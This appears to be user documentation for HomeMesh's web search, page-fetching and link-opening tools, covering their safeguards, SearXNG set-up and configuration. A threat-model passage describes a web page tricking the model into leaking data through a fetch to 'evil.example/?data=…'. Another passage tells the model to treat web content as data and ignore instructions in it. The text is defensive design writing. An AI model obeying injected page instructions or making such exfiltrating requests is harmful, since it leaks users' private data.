# Internet access: web search, reading pages, opening links

HomeMesh can give the assistant three internet tools. All three are **off** until you allow them on a
specific computer, and each runs on a computer you choose:

| Tool | What it does | Runs on | Asks you first? |
|---|---|---|---|
| `web_search` | Searches the web through **your own SearXNG** and returns titles, links and snippets. | A computer with SearXNG (e.g. the Bazzite desktop) | No (you can make it ask, see below) |
| `fetch_url` | Reads one public web page (HTML, text, JSON/XML or PDF) and returns its text and links. | Any computer that allows it | For links you wrote: never. Search results: up to 3 per answer, one per site. Anything else: yes |
| `open_url` | Opens an `http(s)` link in the default browser of that computer ("open YouTube"). | The computer you sit at (e.g. the Windows hub) | **Always**, showing the exact link |

The model decides when to use them; it can only use tools that are allowed on a computer that is
online, and only models with tool support (the **tools** capability on the Models page) get them.

## How it stays safe

* **Opt-in per computer.** A tool runs only on computers whose `worker.allowed_tools` lists it
  (`homemesh worker allow-tool …` on that computer). The coordinator can't turn it on remotely.
* **Your own search engine.** `web_search` talks to the SearXNG you set up; the installer puts it on
  `127.0.0.1` of that computer, so no other computer on your network can use it. SearXNG asks public
  search engines (DuckDuckGo, Brave, Wikipedia, …) for you: no account, no API key. Search queries do
  leave your network; that is the point of a web search. (If you point `web.searxng_url` at another
  computer or a public instance, every query goes there; `homemesh web set-searxng` and
  `homemesh doctor` warn about that.)
* **Never your home network.** `fetch_url` refuses every private, local and special address:
  `127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, link-local (incl. `169.254.169.254`), CGNAT/Tailscale
  `100.64/10`, IPv6 local ranges, multicast and reserved ranges, and IPv4 addresses hidden inside IPv6.
  It also refuses every address on the computer's own networks, and for IPv6 the whole /48 around
  each of its public addresses (at home, the PC, the router, a NAS and guest or IoT networks usually
  all have public IPv6 addresses from that prefix). So a model, or a web page talking to it, can't
  reach your router, Ollama, another HomeMesh computer or a NAS on those addresses. What it can't
  recognise: services you made reachable from the internet yourself (port forwarding) when they are
  asked for by your home's public IPv4 address or a dynamic-DNS name, because HomeMesh doesn't ask an
  outside service what that address is. Every redirect is checked again; HomeMesh connects to exactly
  the address it checked (so a DNS answer that changes in between can't sneak through) while still
  verifying the site's HTTPS certificate against its real name (with Mozilla's list of certificate
  authorities, plus `web.extra_ca_file` if you set one). Only web ports are used (80, 443 and ports
  from 1024 up), downloads are limited (5 MB and 20 s per page or redirect, 5 redirects, 45 s for the
  whole download and 60 s per call, also for compressed pages; only the first 2 million characters of a
  page are read) and proxy settings from the environment are ignored. The model sees about
  8,000 characters of a result: a page's title and links first, then its text, shortened to fit.
* **No silent data leaks through links.** A model that was tricked by a web page might try to send
  your data out by fetching `https://evil.example/?data=…`, or by choosing *which* of a page's links
  to fetch. So `fetch_url` runs without asking only for addresses that **you** wrote in this
  conversation, or that a **search result** (or an earlier fetch itself) supplied, and of those only
  3 per answer and one per site. Links found *on* a page, changed addresses (extra path, query,
  slashes) and everything else show an **Approve / Deny** card with the reason first.
* **Opening links always asks.** `open_url` is an action on your desktop, so it shows the exact link,
  the site on its own line (a long link can't hide where it goes) and the computer name, and waits for
  **Approve**. Links written in tricky ways (fullwidth digits, invisible characters, `0x7f.1`) are shown
  as the real address they lead to. Only `http://` and `https://` links are accepted
  (never files, programs, `javascript:` or Windows settings links), and links into your own network are
  marked as such on the card.
* **Web content is data, not instructions.** Search results and pages are handed to the model as
  untrusted data; the model is told never to follow instructions in them and never to put your private
  information into a search or link, and to name the URL when it uses information from the web. Like
  any language model it can still be misled, which is why actions need your approval.
* **Visible.** Every call, approval and result appears in the chat (expand "arguments and result") and
  in the tool history (`GET /api/v1/tools/executions`); the audit log (Settings → Security) records
  each run and each approval decision. HomeMesh identifies itself to websites with the user agent
  `HomeMesh/<version>` and sends no telemetry.

Want to approve every search and page too? Settings → Tool permissions → set `web_search` / `fetch_url` to
**ask every time**. Want them gone? Turn them off there, or `homemesh worker disallow-tool …`.

## Set-up: Windows hub + Bazzite desktop

This is the layout from the [Windows hub guide](GUIDE_WINDOWS_HUB_BAZZITE_WORKERS.md): search and page
reading on the Bazzite desktop (it runs SearXNG), opening links on the Windows PC you sit at.

### 1. SearXNG on the Bazzite desktop

In a terminal on the Bazzite desktop, in the HomeMesh folder (`cd ~/homemesh`; update it first as in the guide's "Updating later"):

```bash
bash deploy/bazzite/install-searxng.sh
```

This needs no root and changes nothing outside your home folder. It writes
`~/.config/homemesh-searxng/settings.yml` (only readable by you; JSON output on, rate limiter off, a
random secret key) and a Podman Quadlet user service `homemesh-searxng` (container image pinned to one
SearXNG build, published on `127.0.0.1:8888` only, running as your user, not root, with a read-only
file system and no extra privileges). It downloads the image (about 100 MB), starts it, and checks
that it answers. It then starts whenever you log in. Another port: `--port 8899` (running the script
again later keeps the port you chose). `--configure` only works on a computer where HomeMesh is
already set up (joined).

### 2. Let HomeMesh on the Bazzite desktop use it

```bash
homemesh web set-searxng http://127.0.0.1:8888
homemesh worker allow-tool web_search
homemesh worker allow-tool fetch_url
homemesh restart
homemesh web test "weather in Berlin"
```

`homemesh web test` runs a real search from that computer and prints the results (or what is wrong).
`homemesh web test --fetch https://example.com/` tries reading a page. (`install-searxng.sh --configure`
runs these commands for you.)

### 3. Let the Windows hub open links

In PowerShell on the Windows PC:

```powershell
homemesh worker allow-tool open_url
homemesh restart
```

Optional: `homemesh worker allow-tool fetch_url` on the hub as well, so the assistant can still read
pages when the Bazzite desktop is off. Note that the hub then becomes the default computer for reading
pages (the model can still pick another). Antivirus that inspects HTTPS on Windows breaks page reading
there unless you set `web.extra_ca_file` (see TROUBLESHOOTING.md). (Search needs SearXNG, so it only
works while the Bazzite desktop is on.)

### 4. Try it

Use a chat model with tool support (on the Models page its capabilities include **tools**; Qwen 3 and
Llama 3.1+ models do; very small models use tools poorly). Then ask, for example:

* "Search the web for this week's weather in Berlin and summarise it." → `web_search` on the Bazzite
  desktop, then possibly `fetch_url` on a result.
* "Open YouTube in my browser." → an **Approve** card for `open_url` on the Windows hub showing
  `https://www.youtube.com/`; after you approve, the browser opens on that PC.

Settings → Tool permissions lists each tool with the computers that allow it.

## Configuration: `[web]`

On the computer that runs the tools (`homemesh config path` shows the file):

| Key | Default | Meaning |
|---|---|---|
| `searxng_url` | `""` | Your SearXNG, e.g. `http://127.0.0.1:8888`. Empty: `web_search` reports that it isn't set up. Env shortcut: `HOMEMESH_SEARXNG_URL`. |
| `safesearch` | `1` | SearXNG safe search: `0` off, `1` moderate, `2` strict. |
| `search_language` | `auto` | Search language, e.g. `en`, `de`, `all`. |
| `max_results` | `8` | Results per search (the model may ask for up to 20). |
| `timeout_s` | `20` | Per search request, and per page or redirect for `fetch_url` (one deadline each, max 30). A whole search stops after 40 s; a `fetch_url` download (redirects included) after 45 s, and the whole call after 60 s. |
| `max_download_mb` | `5` | Larger pages are cut off (marked `truncated`). |
| `extra_ca_file` | `""` | An extra CA certificate (PEM) to trust for `fetch_url`, e.g. your antivirus's HTTPS-inspection root. Mozilla's list stays in use; verification is never turned off. |
| `max_redirects` | `5` | |

The tools themselves are allowed in `[worker] allowed_tools` (`web_search`, `fetch_url`, `open_url`).

## Updating or removing SearXNG

The Quadlet file pins the image by digest (`deploy/bazzite/homemesh-searxng.container`), so it never
changes behind your back. HomeMesh updates may move the pin to a newer SearXNG build; to apply it,
`git pull` and run `bash deploy/bazzite/install-searxng.sh` again (your settings file and port are
kept). To pick a newer build yourself, don't edit the file from the repository (that blocks `git pull`);
find its digest (`podman pull docker.io/searxng/searxng:latest`, then
`podman image inspect --format '{{.Digest}}' docker.io/searxng/searxng:latest`) and run
`HOMEMESH_SEARXNG_IMAGE=docker.io/searxng/searxng@sha256:<digest> bash deploy/bazzite/install-searxng.sh`.
A later run without that variable goes back to the build HomeMesh pins.

Remove: `bash deploy/bazzite/install-searxng.sh --remove` stops it and removes the service; the settings,
image and cache volume are kept until you delete them (the script prints how). Then
`homemesh web set-searxng none` and `homemesh worker disallow-tool web_search`.

## Limits

* Pages are read as HTML/text, without running JavaScript: sites that build their content in the browser
  show little, and logins, cookies and paywalls are not supported. Some sites refuse automated requests
  (HTTP 403).
* Search engines sometimes rate-limit or show a CAPTCHA to SearXNG; the result then lists them under
  `unresponsive_engines`, and the other engines still answer.
* `open_url` opens a page; it cannot click, type or read what the browser shows afterwards.
* On Linux, `open_url` needs a graphical desktop session for that user (it uses `xdg-open`; when HomeMesh
  was started by systemd before the desktop, it goes through the user manager with `systemd-run --user`).
  This path has only been tested with stand-in programs, not yet on a real KDE or GNOME desktop.

## What has been tested

See [MILESTONES.md](MILESTONES.md). In short: the address checks, redirects, HTTPS name verification,
size limits, SearXNG JSON handling, approvals and worker-side checks are covered by automated tests; a
real SearXNG (the same source revision as the pinned image) and real web pages were used during
development; CI runs `install-searxng.sh` with rootless Podman and checks the Quadlet file with Bazzite's
own Podman. Opening the browser on a real Windows desktop and the Quadlet on a real Bazzite desktop are
not yet confirmed.
